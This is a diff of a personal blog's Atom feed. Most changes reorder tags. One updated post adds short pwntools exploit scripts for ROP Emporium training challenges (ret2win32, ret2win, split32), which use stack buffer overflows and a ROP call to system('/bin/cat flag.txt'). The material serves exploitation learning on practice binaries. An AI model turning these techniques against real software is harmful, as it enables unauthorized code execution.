@@ -64,9 +64,9 @@
     
       <category term="pwn" scheme="http://suvii22.github.io/tags/pwn/"/>
     
-      <category term="ROP" scheme="http://suvii22.github.io/tags/ROP/"/>
-    
       <category term="栈溢出" scheme="http://suvii22.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+    
+      <category term="ROP" scheme="http://suvii22.github.io/tags/ROP/"/>
     
   </entry>
   
@@ -75,9 +75,9 @@
     <link href="http://suvii22.github.io/2019/12/07/ROP-Emporium%E9%80%9A%E5%85%B3%E4%B9%8B%E6%97%85/"/>
     <id>http://suvii22.github.io/2019/12/07/ROP-Emporium%E9%80%9A%E5%85%B3%E4%B9%8B%E6%97%85/</id>
     <published>2019-12-07T07:46:40.000Z</published>
-    <updated>2019-12-08T01:15:46.533Z</updated>
+    <updated>2019-12-13T12:45:36.487Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="ret2win32"><a href="#ret2win32" class="headerlink" title="ret2win32"></a>ret2win32</h2><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="variable">import</span> *</span><br><span class="line"><span class="variable">p</span> = <span class="function"><span class="title">process</span>(<span class="string">'./ret2win32'</span>)</span></span><br><span class="line"><span class="variable">p.sendline</span>(<span class="string">'a'</span>*<span class="number">0</span><span class="variable">x28</span> + <span class="string">'aaaa'</span> + <span class="function"><span class="title">p32</span>(<span class="number">0</span><span class="variable">x8048659</span>))</span></span><br><span class="line"><span class="variable">p.interactive</span>()</span><br></pre></td></tr></table></figure><p>TODO</p>]]></content>
+    <content type="html"><![CDATA[<h2 id="ret2win32"><a href="#ret2win32" class="headerlink" title="ret2win32"></a>ret2win32</h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line"># -*- coding:utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./ret2win32'</span>)</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x28</span> + <span class="string">'aaaa'</span> + p32(<span class="number">0x8048659</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2win"><a href="#ret2win" class="headerlink" title="ret2win"></a>ret2win</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">p = process('./ret2win')</span><br><span class="line">flag_addr = 0x400811</span><br><span class="line"></span><br><span class="line">payload = 'a'*0x28+p64(flag_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="split32"><a href="#split32" class="headerlink" title="split32"></a>split32</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line">from pwn import *</span><br><span class="line">p = process('./split32')</span><br><span class="line">elf = ELF('./split32')</span><br><span class="line"></span><br><span class="line">sys_addr = elf.symbols['system']</span><br><span class="line">binsh_addr = next(elf.search('/bin/cat flag.txt'))</span><br><span class="line">payload = 'a'*0x28 + 'aaaa' + p32(sys_addr)+'bbbb'+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>TODO</p>]]></content>
     
     <summary type="html">
     
@@ -93,9 +93,9 @@
     
       <category term="pwn" scheme="http://suvii22.github.io/tags/pwn/"/>
     
-      <category term="ROP" scheme="http://suvii22.github.io/tags/ROP/"/>
-    
       <category term="栈溢出" scheme="http://suvii22.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+    
+      <category term="ROP" scheme="http://suvii22.github.io/tags/ROP/"/>
     
   </entry>
   
@@ -151,9 +151,9 @@
     
       <category term="pwn" scheme="http://suvii22.github.io/tags/pwn/"/>
     
-      <category term="Linux" scheme="http://suvii22.github.io/tags/Linux/"/>
-    
       <category term="IO" scheme="http://suvii22.github.io/tags/IO/"/>
+    
+      <category term="Linux" scheme="http://suvii22.github.io/tags/Linux/"/>
     
   </entry>
   
@@ -350,9 +350,9 @@
     
       <category term="pwn" scheme="http://suvii22.github.io/tags/pwn/"/>
     
-      <category term="ROP" scheme="http://suvii22.github.io/tags/ROP/"/>
-    
       <category term="栈溢出" scheme="http://suvii22.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
+    
+      <category term="ROP" scheme="http://suvii22.github.io/tags/ROP/"/>
     
       <category term="canary" scheme="http://suvii22.github.io/tags/canary/"/>
     
